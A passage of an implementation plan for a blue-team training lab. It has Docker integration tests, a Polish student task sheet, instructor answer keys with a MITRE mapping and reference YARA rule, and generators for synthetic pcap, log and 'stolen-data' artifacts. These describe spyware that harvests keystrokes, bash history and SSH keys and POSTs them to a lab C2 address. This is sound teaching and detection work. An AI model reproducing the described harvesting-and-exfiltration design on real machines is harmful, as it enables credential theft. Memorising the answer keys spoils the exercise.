if not _docker_available():
    pytest.skip("docker or docker compose not available", allow_module_level=True)


def _compose(*args, env=None, check=True, timeout=180):
    base = ["docker", "compose", "-f", str(COMPOSE_DIR / "docker-compose.yml")]
    return subprocess.run(base + list(args), env=env, check=check,
                          capture_output=True, text=True, timeout=timeout,
                          cwd=COMPOSE_DIR)


@pytest.fixture(scope="module")
def stack():
    import os
    env = {**os.environ, "ROUND": "1"}
    _compose("down", "-v", "--remove-orphans", check=False)
    _compose("build", "--build-arg", "ROUND=1", env=env, timeout=900)
    _compose("--profile", "full", "up", "-d", env=env)
    try:
        yield env
    finally:
        _compose("logs", "--no-color", check=False)
        _compose("down", "-v", "--remove-orphans", check=False)


def test_round_1_c2_receives_payload_within_90_seconds(stack):
    """Victim must POST to c2-server within one exfil interval + buffer."""
    deadline = time.time() + 120
    last_output = ""
    while time.time() < deadline:
        r = _compose("exec", "-T", "c2-server",
                     "sh", "-c",
                     "test -s /data/received.jsonl && cat /data/received.jsonl || true",
                     check=False, timeout=15)
        last_output = (r.stdout or "").strip()
        if last_output:
            break
        time.sleep(3)

    assert last_output, f"no payloads after 90s. stdout={last_output!r}"

    first_line = last_output.splitlines()[0]
    record = json.loads(first_line)
    assert record["host"] == "workstation-042"
    assert record["user"] == "analyst"
    assert "received_at" in record


def test_round_1_stolen_bash_history_present_in_payload(stack):
    r = _compose("exec", "-T", "c2-server",
                 "sh", "-c", "cat /data/received.jsonl",
                 check=False, timeout=15)
    records = [json.loads(line) for line in r.stdout.strip().splitlines() if line]
    assert records, "no payloads collected"
    # At least one record must contain harvested files; timing means the first
    # few records might be empty (keylogger buffer empty, no files read yet).
    with_files = [rec for rec in records if rec.get("files")]
    assert with_files, "no record with harvested files within the window"
    bash_hist = with_files[0]["files"].get(".bash_history", "")
    assert "ls -la" in bash_hist, f"bash_history content unexpected: {bash_hist!r}"
```

- [ ] **Step 2: Run test to verify Docker gating works**

Without Docker available:
Run: `pytest tests/test_techlab_integration.py -v`
Expected: all tests SKIPPED with "docker or docker compose not available".

With Docker available (on a machine where the full build works):
Run: `pytest tests/test_techlab_integration.py -v -m docker`
Expected: 2 passed after ~2–5 minutes (includes image build on first run).

- [ ] **Step 3: No separate implementation — the test integrates the entire stack**

- [ ] **Step 4: Confirm cleanup behavior**

After the test, run `docker ps --filter name=ghost-` and confirm no lingering containers remain.

- [ ] **Step 5: Commit**

```bash
git add tests/test_techlab_integration.py
git commit -m "test(techlab): R1 end-to-end integration (C2 receives payload in ≤120s)"
```

---

### Task 14 — `round-1-naive/zadania.md` (Polish student tasks)

Student-facing task sheet for R1 (techlab variant — students work inside the running Docker stack). Mirrors the 8 steps in spec § Rounds and Tasks / Round 1. Polish prose; command examples in English. Answer keys live in `instructor-notes.md` (Task 15).

**Files:**
- Create: `module-techlab/rounds/round-1-naive/zadania.md`

- [ ] **Step 1: Write a structural test**

Create `tests/test_round_1_materials.py`:
```python
import pathlib

ROUND_DIR = pathlib.Path(__file__).parent.parent / "module-techlab" / "rounds" / "round-1-naive"


def test_zadania_exists():
    assert (ROUND_DIR / "zadania.md").is_file()


def test_zadania_covers_all_required_steps():
    text = (ROUND_DIR / "zadania.md").read_text(encoding="utf-8")
    # Headings for each spec-mandated step. Polish section names.
    required_phrases = [
        "Faza red team", "Faza blue team",
        "ps", "lsof", "strace", "tcpdump",
        "IOCs", "MITRE ATT&CK",
        "YARA",
        "NIST SP 800-61",
    ]
    missing = [p for p in required_phrases if p not in text]
    assert not missing, f"zadania.md missing: {missing}"


def test_zadania_is_polish():
    text = (ROUND_DIR / "zadania.md").read_text(encoding="utf-8")
    polish_letters = sum(text.count(ch) for ch in "ąćęłńóśźżĄĆĘŁŃÓŚŹŻ")
    assert polish_letters >= 20, f"zadania.md looks insufficiently Polish ({polish_letters} diacritics)"


def test_instructor_notes_exists():
    assert (ROUND_DIR / "instructor-notes.md").is_file()


def test_instructor_notes_lists_mitre_ground_truth():
    text = (ROUND_DIR / "instructor-notes.md").read_text(encoding="utf-8")
    # Every R1 TTP must appear.
    for tid in ("T1056.001", "T1113", "T1005", "T1071.001", "T1041"):
        assert tid in text, f"instructor-notes.md missing TTP {tid}"


def test_instructor_notes_contains_yara_reference_rule():
    text = (ROUND_DIR / "instructor-notes.md").read_text(encoding="utf-8")
    assert "rule" in text and "meta:" in text and "strings:" in text, (
        "reference YARA rule missing from instructor notes"
    )
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_round_1_materials.py -v`
Expected: `FileNotFoundError` on all six.

- [ ] **Step 3: Write `zadania.md`**

Create `module-techlab/rounds/round-1-naive/zadania.md`. Use the outline below; implementer writes full Polish sentences per bullet, and preserves English command blocks verbatim.

```markdown
# Runda 1 — Naïve: zadania dla studenta

> Pracujesz w kontenerze `analyst-ws`. Stack został uruchomiony komendą:
> ```
> ROUND=1 docker compose --profile full up -d
> ```
> Wszystkie polecenia wykonujesz wewnątrz kontenera `analyst-ws` (np. `docker compose exec analyst-ws bash`).

## Cel
Zidentyfikuj proces spyware działający w kontenerze `victim`, odtwórz sposób jego działania, udokumentuj IOCs, zatrzymaj go, oraz napisz regułę YARA i krótki raport incydentu.

## Faza red team

### 1. Identyfikacja podejrzanego procesu
- Z `analyst-ws` uzyskaj powłokę w `victim`: `docker compose exec victim bash`.
- Wypisz procesy użytkownika `analyst`: `ps -ef --forest -u analyst`.
- Zidentyfikuj proces zawierający `spyware.py`.
- Sprawdź jego otwarte pliki i sockety: `lsof -p <PID>` oraz `ss -tp | grep <PID>`.
- Zweryfikuj ścieżkę binarki: `readlink /proc/<PID>/exe` i `cat /proc/<PID>/cmdline`.

### 2. Analiza dynamiczna (strace)
- Uruchom `strace -f -p <PID> -e trace=openat,read,write,connect,sendto 2> strace.log`.
- Odpowiedz w raporcie: jakie pliki są czytane, jakie dane są wysyłane do sockietu.

### 3. Analiza ruchu sieciowego
- Z `analyst-ws`: `tcpdump -ni eth0 -A -s0 'tcp port 8080' -w /tmp/r1.pcap` (kilka minut).
- Otwórz w Wireshark/tshark: `tshark -r /tmp/r1.pcap -Y http.request -T fields -e http.host -e http.request.uri`.
- Wypisz: adres IP C2, port, URL, zawartość JSON.

### 4. Mapa próbki
Odpowiedz krótko: *co zbiera?*, *jak często wysyła?*, *gdzie wysyła?*, *czy jest utrwalone?*.

## Faza blue team

### 5. Dokumentacja IOCs i mapowanie MITRE ATT&CK
Przygotuj tabelę IOCs (nazwa procesu, ścieżka, IP:port C2, rodzaje wykradanych danych) i powiąż każdą obserwację z identyfikatorem techniki MITRE ATT&CK. Listę dopuszczonych w R1 technik znajdziesz w załączniku raportu.

### 6. Zatrzymanie i weryfikacja
- Zabij proces: `kill -9 <PID>`.
- Zweryfikuj brak kolejnych żądań HTTP do `10.13.37.1:8080` (powtórz `tcpdump`).

### 7. Detekcja — reguła YARA
Napisz regułę YARA (`rules/r1-ghost-naive.yar`) dopasowującą próbkę R1. Powinna zawierać:
- sekcję `strings:` z co najmniej trzema znaczącymi ciągami (np. hardkodowany URL, nazwy pól JSON, unikalne komentarze),
- kondycję `condition:` łączącą ≥2 ciągi logiczną koniunkcją.
Regułę przetestuj na korpusie z `module-casefile/round-1/yara-corpus/` za pomocą auto-gradera: `pytest tests/test_detection_rules.py -k round_1`.

### 8. Raport incydentu (NIST SP 800-61r2)
Jedna strona, cztery fazy: **Detection**, **Containment**, **Eradication**, **Recovery**. Załącznik: tabela MITRE ATT&CK z obserwacjami.

## Kryteria zaliczenia
- Poprawne zidentyfikowanie wszystkich 5 technik MITRE dla R1.
- Reguła YARA: precyzja ≥ 0.95, recall = 1.0 na korpusie R1 (mierzone przez `rule-grader.py`).
- Raport zgodny z NIST SP 800-61r2 i zawierający załącznik MITRE.
```

- [ ] **Step 4: Run tests** (they will still fail until Task 15 adds instructor-notes.md)

Run: `pytest tests/test_round_1_materials.py::test_zadania_exists tests/test_round_1_materials.py::test_zadania_covers_all_required_steps tests/test_round_1_materials.py::test_zadania_is_polish -v`
Expected: 3 passed.

- [ ] **Step 5: Commit**

```bash
git add module-techlab/rounds/round-1-naive/zadania.md tests/test_round_1_materials.py
git commit -m "docs(round-1): techlab zadania.md (Polish, 8 steps)"
```

---

### Task 15 — `round-1-naive/instructor-notes.md` (MITRE GT + reference YARA + answer key)

Instructor-only. Contains the ground-truth MITRE table, the reference YARA rule used to derive positive/negative expectations for the auto-grader, expected student observations at each step, and common mistakes.

**Files:**
- Create: `module-techlab/rounds/round-1-naive/instructor-notes.md`

- [ ] **Step 1: Run the structural tests** (already written in Task 14 — two still red)

Run: `pytest tests/test_round_1_materials.py::test_instructor_notes_exists tests/test_round_1_materials.py::test_instructor_notes_lists_mitre_ground_truth tests/test_round_1_materials.py::test_instructor_notes_contains_yara_reference_rule -v`
Expected: 3 failures (file missing).

- [ ] **Step 2: Write instructor notes**

Create `module-techlab/rounds/round-1-naive/instructor-notes.md`:
```markdown
# Round 1 — Instructor Notes (DO NOT ship in casefile)

> This file contains the ground-truth answer key, MITRE ATT&CK mapping, reference
> YARA rule, and expected student observations. Keep it inside `module-techlab/`;
> `test_casefile_structure.py` enforces that nothing from this path leaks into
> `module-casefile/`.

## MITRE ATT&CK ground truth for R1

| Observation | Technique | ID |
|---|---|---|
| Xlib/pynput loop captures keystrokes | Input Capture: Keylogging | **T1056.001** |
| `scrot` to `/tmp/screen-<ts>.png` | Screen Capture | **T1113** |
| `open()`/`shutil` reading `~/.bash_history`, `~/.ssh/id_rsa`, `Documents/` | Data from Local System | **T1005** |
| HTTP POST to `10.13.37.1:8080/collect` | Application Layer Protocol: Web | **T1071.001** |
| Exfil over the same channel used as command path | Exfiltration Over C2 Channel | **T1041** |

Any declared TTP outside this set is incorrect for R1. `test_mitre_mapping.py` enforces the allowlist at source level.

## OPSEC posture (R1 baseline — no mistakes, just transparency)

R1 is deliberately naïve. There is nothing "hidden" for students to uncover — the teaching point is that *every detection artifact is in plain sight*. The list of visible artifacts students should name:

1. Process name: literally `python3 /opt/spyware/spyware.py` in `ps -ef`.
2. Open socket to `10.13.37.1:8080` visible in `ss -tnp`.
3. C2 URL embedded as a plaintext string in the binary (`strings /opt/spyware/spyware.py | grep 10.13`).
4. JSON field names (`host`, `user`, `keys`, `files`, `screenshot_bytes`) appear in `tcpdump -A` output.
5. Harvested files are readable from the POST body directly.
6. **Screenshot taken but not exfiltrated (intentional partial-implementation flaw):** `take_screenshot()` saves a PNG to `/tmp/screen-<ts>.png` and reports its file *size* in the POST (`"screenshot_bytes": N`), but never reads or sends the file contents. T1113 (Screen Capture) applies because the screenshot is taken; the file content never reaches the C2, which is an OPSEC flaw the attacker didn't notice. Sharp students examining the JSON payload will see a non-zero `screenshot_bytes` but no corresponding base64 or binary field — a good pivot for discussion. If asked, confirm this is a bug in the attacker's code, not an intentional design.

If a student says "R1 is sophisticated", redirect: R1 is the null hypothesis. OPSEC improvement only begins in R2.

## Reference YARA rule (positive example for the grader)

```yara
rule Ghost_R1_Naive_Spyware
{
    meta:
        author = "instructor"
        description = "Matches the R1 naïve spyware sample"
        round = "1"
        mitre = "T1056.001,T1113,T1005,T1071.001,T1041"
    strings:
        $lab_header = "GHOST-IN-THE-BOX LAB"
        $c2_ip = "10.13.37.1"
        $field1 = "screenshot_bytes"
        $field2 = "\"keys\""
        $import_http = "import exfil_http"
    condition:
        $lab_header and (3 of ($c2_ip, $field1, $field2, $import_http))
}
```

This rule is what the auto-grader uses as a baseline. Student-written rules are graded for precision and recall against the same `module-casefile/round-1/yara-corpus/` that this one was tuned against.

## Expected student deliverables

1. **IOC table** listing process name/path, C2 endpoint, stolen-data types, exfil cadence.
2. **MITRE table** matching the ground truth above (5 techniques).
3. **YARA rule** matching ≥3 strings similar to the reference rule. Precision ≥ 0.95 and Recall = 1.0 on the R1 corpus.
4. **NIST 800-61r2 report** — one page covering Detection (how the process was found), Containment (isolation / kill), Eradication (removal steps), Recovery (verification). Appendix: MITRE mapping.

## Common student mistakes in R1

- Declaring T1036.005 (Masquerading) for R1 — this only applies once the process name is forged (R2).
- Missing T1041 because they only tag T1071.001 — the two coexist in R1 since data exfil rides the same HTTP channel.
- YARA rule with only the `$c2_ip` string — too brittle (any machine with that IP in its notes will false-positive). Encourage ≥3 distinct pivots.
- Report skips Recovery because "there is nothing to restore". Recovery includes verification that traffic has stopped and listing hardening steps for the next round.
```

- [ ] **Step 3: Run tests**

Run: `pytest tests/test_round_1_materials.py -v`
Expected: 6 passed.

- [ ] **Step 4: Verify no instructor artefacts leak to casefile**

(Casefile directory doesn't yet exist; a proper leak-guard test lands in Task 21.)

- [ ] **Step 5: Commit**

```bash
git add module-techlab/rounds/round-1-naive/instructor-notes.md
git commit -m "docs(round-1): instructor notes with MITRE GT and reference YARA"
```

---

### Task 16 — `generate_pcap.py` — R1 HTTP exfil pcap

Deterministic synthetic pcap showing the R1 plaintext JSON POST pattern. Uses scapy to craft Ethernet + IPv4 + TCP + HTTP frames. Seeds `random` with `RANDOM_SEED`. Output: `module-casefile/round-1/network-capture.pcap`.

**Files:**
- Create: `generators/generate_pcap.py`
- Create: `tests/test_generators.py`

- [ ] **Step 1: Write the failing test**

Create `tests/test_generators.py`:
```python
"""Unit tests for generators/. Keep scapy optional; skip if missing."""
import pathlib

import pytest

scapy_all = pytest.importorskip("scapy.all")


def test_generate_pcap_is_deterministic(tmp_path):
    from generators import generate_pcap

    p1 = tmp_path / "a.pcap"
    p2 = tmp_path / "b.pcap"

    generate_pcap.generate(output_path=p1, round_num=1)
    generate_pcap.generate(output_path=p2, round_num=1)

    assert p1.read_bytes() == p2.read_bytes(), "pcap generation is not deterministic"


def test_generate_pcap_contains_c2_ip(tmp_path):
    from generators import generate_pcap
    from generators.data import scenario_facts as sf

    out = tmp_path / "r1.pcap"
    generate_pcap.generate(output_path=out, round_num=1)

    packets = scapy_all.rdpcap(str(out))
    assert len(packets) > 0
    # At least one packet must have C2_IP as dst or src.
    c2 = sf.C2_IP
    assert any(
        (scapy_all.IP in pkt and (pkt[scapy_all.IP].dst == c2 or pkt[scapy_all.IP].src == c2))
        for pkt in packets
    )


def test_generate_pcap_contains_plaintext_json_payload(tmp_path):
    from generators import generate_pcap

    out = tmp_path / "r1.pcap"
    generate_pcap.generate(output_path=out, round_num=1)
    raw = out.read_bytes()
    assert b"POST /collect" in raw
    assert b"workstation-042" in raw
    assert b"\"keys\"" in raw


def test_generate_pcap_rejects_unknown_round(tmp_path):
    from generators import generate_pcap
    with pytest.raises(ValueError, match="round"):
        generate_pcap.generate(output_path=tmp_path / "x.pcap", round_num=7)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pip install scapy==2.5.0 && pytest tests/test_generators.py -v`
Expected: `ModuleNotFoundError: No module named 'generators.generate_pcap'`.

- [ ] **Step 3: Implement `generate_pcap.py`**

Create `generators/generate_pcap.py`:
```python
"""Deterministic pcap generator for casefile network-capture.pcap."""
from __future__ import annotations

import argparse
import json
import pathlib
import random
from typing import Iterable

from scapy.all import Ether, IP, TCP, Raw, wrpcap

from generators.data import scenario_facts as sf


def _seed() -> random.Random:
    return random.Random(sf.RANDOM_SEED)


def _build_r1_http_post(rng: random.Random, seq: int, ack: int, sample_index: int):
    """One HTTP POST transaction: SYN, SYN-ACK, ACK, PSH-ACK (request), ACK, FIN-ACK pair."""
    victim_ip = "10.13.37.50"  # victim receives a dynamic address; pick deterministic one
    c2 = sf.C2_IP
    src_port = 40000 + sample_index
    dst_port = sf.C2_HTTP_PORT

    # Minimal but valid HTTP POST with the sample payload students expect to see.
    payload = {
        "host": sf.VICTIM_HOSTNAME,
        "user": sf.VICTIM_USERNAME,
        "ts_epoch": 1712332800 + sample_index * sf.EXFIL_INTERVAL_SECONDS,
        "keys": list("hello"[:rng.randint(0, 5)]),
        "files": {
            ".bash_history": "ls -la\ncat Documents/report-draft.txt\n",
        },
        "screenshot_bytes": 8192 + sample_index,
    }
    body = json.dumps(payload, separators=(",", ":"))
    request = (
        f"POST /collect HTTP/1.1\r\n"
        f"Host: {c2}:{dst_port}\r\n"
        f"User-Agent: python-requests/2.32.3\r\n"
        f"Accept-Encoding: gzip, deflate\r\n"
        f"Accept: */*\r\n"
        f"Connection: keep-alive\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
        f"{body}"
    ).encode("utf-8")

    response = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: 17\r\n\r\n"
        b"{\"status\":\"ok\"}\n"
    )

    eth = Ether(src="02:42:ac:11:00:02", dst="02:42:ac:11:00:01")

    def s2c(flags: str, seq_: int, ack_: int, data: bytes = b""):
        tcp = TCP(sport=src_port, dport=dst_port, flags=flags, seq=seq_, ack=ack_)
        pkt = eth / IP(src=victim_ip, dst=c2) / tcp
        return pkt if not data else pkt / Raw(load=data)

    def c2s(flags: str, seq_: int, ack_: int, data: bytes = b""):
        tcp = TCP(sport=dst_port, dport=src_port, flags=flags, seq=seq_, ack=ack_)
        pkt = eth / IP(src=c2, dst=victim_ip) / tcp
        return pkt if not data else pkt / Raw(load=data)

    packets = [
        s2c("S", seq, 0),
        c2s("SA", ack, seq + 1),
        s2c("A", seq + 1, ack + 1),
        s2c("PA", seq + 1, ack + 1, request),
        c2s("A", ack + 1, seq + 1 + len(request)),
        c2s("PA", ack + 1, seq + 1 + len(request), response),
        s2c("A", seq + 1 + len(request), ack + 1 + len(response)),
        s2c("FA", seq + 1 + len(request), ack + 1 + len(response)),
        c2s("FA", ack + 1 + len(response), seq + 2 + len(request)),
    ]
    return packets


def generate(output_path: pathlib.Path, round_num: int) -> None:
    if round_num != 1:
        raise ValueError(f"unknown round: {round_num} (this generator only handles R1)")

    rng = _seed()
    packets: list = []
    # Three exfil cycles = believable "a few minutes of dwell" capture.
    for i in range(3):
        seq = 1000 + i * 100_000
        ack = 2000 + i * 100_000
        packets.extend(_build_r1_http_post(rng, seq=seq, ack=ack, sample_index=i))

    wrpcap(str(output_path), packets)


def main(argv: Iterable[str] | None = None) -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--round", type=int, required=True)
    ap.add_argument("--output", type=pathlib.Path, required=True)
    args = ap.parse_args(argv)
    generate(args.output, args.round)


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/test_generators.py -v -k generate_pcap`
Expected: 4 passed.

- [ ] **Step 5: Commit**

```bash
git add generators/generate_pcap.py tests/test_generators.py
git commit -m "feat(generators): deterministic R1 HTTP exfil pcap via scapy"
```

---

### Task 17 — `generate_logs.py` — R1 auth.log + syslog

Deterministic Linux-style log files for R1. `auth.log` shows the `analyst` session start; `syslog` shows generic kernel/systemd lines plus a couple of entries hinting at the spyware's network activity. Seeded with `RANDOM_SEED`.

**Files:**
- Create: `generators/generate_logs.py`
- Modify: `tests/test_generators.py` — add log tests.

- [ ] **Step 1: Write the failing test**

Append to `tests/test_generators.py`:
```python
# --- generate_logs ---------------------------------------------------------

def test_generate_logs_is_deterministic(tmp_path):
    from generators import generate_logs

    a = tmp_path / "a"
    b = tmp_path / "b"
    a.mkdir(); b.mkdir()

    generate_logs.generate(output_dir=a, round_num=1)
    generate_logs.generate(output_dir=b, round_num=1)

    assert (a / "auth.log").read_text() == (b / "auth.log").read_text()
    assert (a / "syslog").read_text() == (b / "syslog").read_text()


def test_generate_logs_produces_expected_files(tmp_path):
    from generators import generate_logs

    generate_logs.generate(output_dir=tmp_path, round_num=1)
    assert (tmp_path / "auth.log").is_file()
    assert (tmp_path / "syslog").is_file()


def test_generate_logs_auth_log_mentions_victim_user(tmp_path):
    from generators import generate_logs
    from generators.data import scenario_facts as sf

    generate_logs.generate(output_dir=tmp_path, round_num=1)
    text = (tmp_path / "auth.log").read_text()
    assert sf.VICTIM_USERNAME in text
    assert sf.VICTIM_HOSTNAME in text
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_generators.py -v -k generate_logs`
Expected: `ModuleNotFoundError: No module named 'generators.generate_logs'`.

- [ ] **Step 3: Implement `generate_logs.py`**

Create `generators/generate_logs.py`:
```python
"""Deterministic syslog/auth.log generator for R1 casefile."""
from __future__ import annotations

import argparse
import datetime
import pathlib
import random
from typing import Iterable

from generators.data import scenario_facts as sf


BASE_EPOCH = datetime.datetime(2026, 3, 14, 8, 0, 0, tzinfo=datetime.timezone.utc)


def _fmt(ts: datetime.datetime, host: str, program: str, msg: str) -> str:
    return f"{ts.strftime('%b %d %H:%M:%S')} {host} {program}: {msg}"


def _r1_auth_lines(rng: random.Random) -> list[str]:
    host = sf.VICTIM_HOSTNAME
    user = sf.VICTIM_USERNAME
    ts = BASE_EPOCH
    lines = [
        _fmt(ts, host, "systemd-logind[841]",
             f"New session 3 of user {user}."),
        _fmt(ts + datetime.timedelta(seconds=2), host, "login[1032]",
             f"pam_unix(login:session): session opened for user {user}(uid=1000) by LOGIN(uid=0)"),
        _fmt(ts + datetime.timedelta(seconds=12), host, f"su[{1100 + rng.randint(0, 50)}]",
             f"pam_unix(su:session): session opened for user {user} by {user}(uid=1000)"),
    ]
    return lines


def _r1_syslog_lines(rng: random.Random) -> list[str]:
    host = sf.VICTIM_HOSTNAME
    ts = BASE_EPOCH + datetime.timedelta(minutes=5)
    lines: list[str] = []
    for i in range(10):
        t = ts + datetime.timedelta(seconds=i * 60 + rng.randint(0, 5))
        lines.append(
            _fmt(t, host, "CRON[12345]",
                 "(analyst) CMD (command_not_found spyware.py)")
        )
        lines.append(
            _fmt(t + datetime.timedelta(seconds=2), host,
                 "systemd[1]",
                 "Started Session " + str(4 + i) + " of user analyst.")
        )
    # A handful of kernel/network messages referencing the C2 destination.
    for i in range(3):
        t = ts + datetime.timedelta(seconds=30 + i * sf.EXFIL_INTERVAL_SECONDS)
        lines.append(
            _fmt(t, host, "kernel",
                 f"[  {150 + i * 60}.{rng.randint(100000, 999999)}] "
                 f"IN=eth0 OUT= SRC=10.13.37.50 DST={sf.C2_IP} LEN=512 "
                 f"PROTO=TCP SPT={40000 + i} DPT={sf.C2_HTTP_PORT} WINDOW=64240")
        )
    return lines


def generate(output_dir: pathlib.Path, round_num: int) -> None:
    if round_num != 1:
        raise ValueError(f"unknown round: {round_num} (this generator only handles R1)")
    output_dir.mkdir(parents=True, exist_ok=True)
    rng = random.Random(sf.RANDOM_SEED)
    auth = _r1_auth_lines(rng)
    syslog = _r1_syslog_lines(rng)
    (output_dir / "auth.log").write_text("\n".join(auth) + "\n", encoding="utf-8")
    (output_dir / "syslog").write_text("\n".join(syslog) + "\n", encoding="utf-8")


def main(argv: Iterable[str] | None = None) -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--round", type=int, required=True)
    ap.add_argument("--output-dir", type=pathlib.Path, required=True)
    args = ap.parse_args(argv)
    generate(args.output_dir, args.round)


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/test_generators.py -v -k generate_logs`
Expected: 3 passed.

- [ ] **Step 5: Commit**

```bash
git add generators/generate_logs.py tests/test_generators.py
git commit -m "feat(generators): deterministic R1 auth.log and syslog"
```

---

### Task 18 — `generate_artifacts.py` — process list + stolen-data JSON

**Files:**
- Create: `generators/generate_artifacts.py`
- Modify: `tests/test_generators.py`

- [ ] **Step 1: Write the failing test**

Append to `tests/test_generators.py`:
```python
# --- generate_artifacts ----------------------------------------------------

def test_generate_artifacts_is_deterministic(tmp_path):
    from generators import generate_artifacts

    a = tmp_path / "a"; b = tmp_path / "b"
    a.mkdir(); b.mkdir()
    generate_artifacts.generate(output_dir=a, round_num=1)
    generate_artifacts.generate(output_dir=b, round_num=1)

    for fname in ("process-list.txt", "stolen-data-sample.json"):
        assert (a / fname).read_bytes() == (b / fname).read_bytes()


def test_generate_artifacts_process_list_shows_spyware(tmp_path):
    from generators import generate_artifacts
    from generators.data import scenario_facts as sf

    generate_artifacts.generate(output_dir=tmp_path, round_num=1)
    text = (tmp_path / "process-list.txt").read_text()
    assert "python3 /opt/spyware/spyware.py" in text
    assert sf.VICTIM_USERNAME in text


def test_generate_artifacts_stolen_data_contains_required_fields(tmp_path):
    import json
    from generators import generate_artifacts
    from generators.data import scenario_facts as sf

    generate_artifacts.generate(output_dir=tmp_path, round_num=1)
    records = [json.loads(line) for line in
               (tmp_path / "stolen-data-sample.json").read_text().splitlines() if line.strip()]
    assert records, "stolen-data-sample.json empty"
    for rec in records:
        assert rec["host"] == sf.VICTIM_HOSTNAME
        assert rec["user"] == sf.VICTIM_USERNAME
        assert "keys" in rec
        assert "files" in rec
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_generators.py -v -k generate_artifacts`
Expected: `ModuleNotFoundError`.

- [ ] **Step 3: Implement `generate_artifacts.py`**

Create `generators/generate_artifacts.py`:
```python
"""Deterministic text-artifact generator — process list and stolen-data JSONL."""
from __future__ import annotations

import argparse
import json
import pathlib
import random
from typing import Iterable

from generators.data import scenario_facts as sf


PROC_LIST_HEADER = "UID        PID  PPID   PRI  NI      VSZ      RSS WCHAN  STAT START  TIME CMD"


def _r1_process_list(rng: random.Random) -> str:
    """A minimal ps-elf-like snapshot with the spyware visible as its own process."""
    rows = [
        ("root",        1,      0, 19,  0, 167300,  11244, "-",    "Ss",  "08:00", "0:02", "/sbin/init"),
        ("root",      128,      1, 19,  0,  42780,   5220, "-",    "Ss",  "08:00", "0:00", "/lib/systemd/systemd-journald"),
        ("root",      412,      1, 19,  0,  13460,   3120, "-",    "Ss",  "08:00", "0:00", "/usr/sbin/cron -f"),
        ("root",      843,      1, 19,  0,  15584,   2212, "-",    "Ss",  "08:00", "0:00", "/usr/sbin/sshd -D"),
        (sf.VICTIM_USERNAME, 1032, 843, 19,  0,  21440,   4880, "wait", "Ss+", "08:12", "0:00", "-bash"),
        (sf.VICTIM_USERNAME, 2104, 1032, 19,  0, 104300,  29884, "-",    "S",   "08:42", "0:15",
         "python3 /opt/spyware/spyware.py"),
        (sf.VICTIM_USERNAME, 2110, 2104, 19,  0,  18740,   2112, "poll_s","S",   "08:42", "0:01", "Xvfb :99 -screen 0 1024x768x24"),
    ]
    rng.shuffle(rows[1:5])  # non-sensitive cosmetic shuffle, deterministic
    lines = [PROC_LIST_HEADER]
    for uid, pid, ppid, pri, ni, vsz, rss, wchan, stat, start, time_, cmd in rows:
        lines.append(
            f"{uid:<8} {pid:>6} {ppid:>5}  {pri:>4} {ni:>2} {vsz:>8} {rss:>8} {wchan:<6} {stat:<4} {start:<6} {time_:<6} {cmd}"
        )
    return "\n".join(lines) + "\n"


def _r1_stolen_data(rng: random.Random) -> list[dict]:
    base_epoch = 1712332800
    records = []
    for i in range(3):
        key_count = rng.randint(3, 8)
        records.append({
            "received_at": base_epoch + i * sf.EXFIL_INTERVAL_SECONDS + 0.0,
            "host": sf.VICTIM_HOSTNAME,
            "user": sf.VICTIM_USERNAME,
            "ts_epoch": base_epoch + i * sf.EXFIL_INTERVAL_SECONDS,
            "keys": list("password123"[:key_count]),
            "files": {
                ".bash_history": "ls -la\ncat Documents/report-draft.txt\nssh analyst@prod-01\n",
                ".ssh/id_rsa": "-----BEGIN OPENSSH PRIVATE KEY-----\n"
                               "MOCK-RSA-PRIVATE-KEY-DO-NOT-USE-FOR-ANYTHING\n"
                               "-----END OPENSSH PRIVATE KEY-----\n",
                "Documents/report-draft.txt": "Q4 report draft — internal only. Revenue figures redacted.\n",
            },
            "screenshot_bytes": 8192 + i * 512,
        })
    return records


def generate(output_dir: pathlib.Path, round_num: int) -> None:
    if round_num != 1:
        raise ValueError(f"unknown round: {round_num} (this generator only handles R1)")
    output_dir.mkdir(parents=True, exist_ok=True)
    rng = random.Random(sf.RANDOM_SEED)

    (output_dir / "process-list.txt").write_text(_r1_process_list(rng), encoding="utf-8")

    records = _r1_stolen_data(rng)
    (output_dir / "stolen-data-sample.json").write_text(
        "\n".join(json.dumps(r) for r in records) + "\n",
        encoding="utf-8",
    )


def main(argv: Iterable[str] | None = None) -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--round", type=int, required=True)
    ap.add_argument("--output-dir", type=pathlib.Path, required=True)
    args = ap.parse_args(argv)
    generate(args.output_dir, args.round)


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/test_generators.py -v`
Expected: 10 passed (pcap 4 + logs 3 + artifacts 3).

- [ ] **Step 5: Commit**

```bash
git add generators/generate_artifacts.py tests/test_generators.py
git commit -m "feat(generators): deterministic R1 process list and stolen-data sample"
```

---

### Task 19 — Run generators, commit R1 casefile artifacts

The generators themselves are deterministic; running them once and committing the output is how the casefile gets its artifacts. This task has no new source code — it's an explicit generation-and-commit step the implementer must perform so subsequent tests can assert on real files.

**Files:**
- Create (via generators): `module-casefile/round-1/network-capture.pcap`
- Create (via generators): `module-casefile/round-1/auth.log`
- Create (via generators): `module-casefile/round-1/syslog`
- Create (via generators): `module-casefile/round-1/process-list.txt`
- Create (via generators): `module-casefile/round-1/stolen-data-sample.json`

- [ ] **Step 1: Run each generator against the casefile directory**

```bash
mkdir -p module-casefile/round-1
python -m generators.generate_pcap --round 1 --output module-casefile/round-1/network-capture.pcap
python -m generators.generate_logs --round 1 --output-dir module-casefile/round-1
python -m generators.generate_artifacts --round 1 --output-dir module-casefile/round-1
```

- [ ] **Step 2: Verify outputs**

```bash
file module-casefile/round-1/network-capture.pcap
head -n 5 module-casefile/round-1/auth.log
head -n 5 module-casefile/round-1/process-list.txt
head -n 1 module-casefile/round-1/stolen-data-sample.json | python -m json.tool
```

Each should succeed and show sensible content.

- [ ] **Step 3: No implementation this task**

- [ ] **Step 4: Re-run generators and confirm output is bit-identical**

```bash
